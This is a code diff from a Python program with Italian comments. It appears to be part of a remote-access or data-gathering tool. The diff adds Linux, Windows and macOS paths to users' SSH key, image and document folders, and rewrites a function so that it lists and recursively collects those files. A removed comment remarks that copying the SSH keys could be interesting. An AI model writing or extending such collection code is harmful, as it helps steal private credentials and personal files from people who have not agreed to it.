@@ -34,9 +34,9 @@ __os_dict_types = {0: "linux", 1: "win32", 2: "darwin"}  # Partiamo da 0 in modo
 
 __filesystem_hierarchy = {"Root": ["/", "C:/", "/"],  # Da utilizzare in maniera non ricorsiva, ma per avere le info generali sulle directory possibili
                           "Home": [f"/home/{os.getlogin()}/", f"C:/Users/{os.getlogin()}", f"/Users/{os.getlogin()}"],
-                          "SSH KEYS": [f"/home/{os.getlogin()}/.ssh/"],  # SSH KEYS (Potrebbe risultare interessante copiare queste informazioni)
-                          "Images": [],  # Recupero Immagini (?)
-                          "Documents": [],  # Recupero Documenti (?)
+                          "SSH KEYS": [f"/home/{os.getlogin()}/.ssh/", f"C:/Users/{os.getlogin()}/.ssh/", f"/Users/{os.getlogin()}/.ssh/"],  # SSH KEYS
+                          "Images": [f"/home/{os.getlogin()}/Immagini", f"C:/Users/{os.getlogin()}/Immagini", f"/Users/{os.getlogin()}/Immagini"],  # Recupero Immagini (?)
+                          "Documents": [f"/home/{os.getlogin()}/Documenti", f"C:/Users/{os.getlogin()}/Documenti", f"/Users/{os.getlogin()}/Documenti"],  # Recupero Documenti (?)
                           }
 
 """
@@ -126,11 +126,14 @@ async def get_users(writer: asyncio.StreamWriter) -> None:
 def get_path_content(content_path: str, sys_type: int) -> list:
     """Funzione per il recupero del contenuto di directory e file dato un path."""
     current_position = __filesystem_hierarchy.get(content_path)
-
     total_files = []
-    for path, dirs, files in os.walk(current_position[sys_type]):
-        for filename in files:
-            total_files.append(os.path.join(path, filename))
+    if content_path == "Root":
+        for single_dir in os.listdir(current_position[sys_type]):
+            total_files.append(os.path.join(current_position[sys_type], single_dir))
+    else:
+        for path, dirs, files in os.walk(current_position[sys_type]):
+            for filename in files:
+                total_files.append(os.path.join(path, filename))
     return total_files
 
 
